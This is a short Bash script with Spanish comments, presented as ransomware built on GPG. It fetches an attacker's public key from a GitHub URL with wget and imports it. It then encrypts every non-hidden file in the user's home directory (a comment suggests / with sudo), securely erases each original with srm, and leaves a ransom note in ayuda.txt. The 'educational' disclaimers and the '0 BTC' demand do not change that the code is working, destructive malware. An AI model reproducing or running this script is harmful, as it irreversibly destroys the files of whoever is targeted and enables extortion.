# Un ransomware con GPG
# Nota: no me hago responsable de lo que se haga con este archivo ;)
# @author parzibyte

URL_CLAVE_PUBLICA="https://raw.githubusercontent.com/lojerepro/Test_lojere18/master/l0jere18.key"
CORREO="l0jere18@protonmail.ch"
NOMBRE_ARCHIVO="l0jere18.key"
# En este caso es /home/nombre_de_usuario ;)
# podría ser incluso / e incluso con sudo
DIRECTORIO_ENCRIPTAR=$(getent passwd "$USER" | cut -d: -f6)
# Descargar clave pública
echo "Descargando clave pública..."
wget -O $NOMBRE_ARCHIVO $URL_CLAVE_PUBLICA
# Importarla
echo "Importando clave pública..."
gpg --import $NOMBRE_ARCHIVO
# Nota: para cifrar se usa el siguiente comando:
#gpg -r $CORREO --trust-model always --encrypt $ARCHIVO
# Para eliminar de manera segura, el siguiente:
#srm archivo
# Nota: si quieres otros algoritmos de eliminaci´ón, pasa la opción. Por ejemplo:
#srm --gutmann archivo
#srm --rcmp archivo
#srm --doe archivo
# Pero se debe combinar con find para que cifre todos los archivos recursivamente ;)
echo "Comenzando a encriptar..."
find $DIRECTORIO_ENCRIPTAR ! -name "*.key" -type f -not -path "*/\.*" -exec echo "Encriptando archivo {}..." \; -exec gpg -r $CORREO --trust-model always --encrypt "{}" \; -exec srm "{}" \;
# Pedir rescate
RESCATE="Tus archivos fueron encriptados por un ransomware.
Paga 0 BTC a la dirección bla bla.
Si quieres probar, envíame un correo a $CORREO con el archivo encriptado y
te lo regreso desencriptado

NOTA: lo de arriba fue con propósitos educativos, no me hago responsable
si alguien utiliza este script
"
echo $RESCATE > "$DIRECTORIO_ENCRIPTAR/ayuda.txt"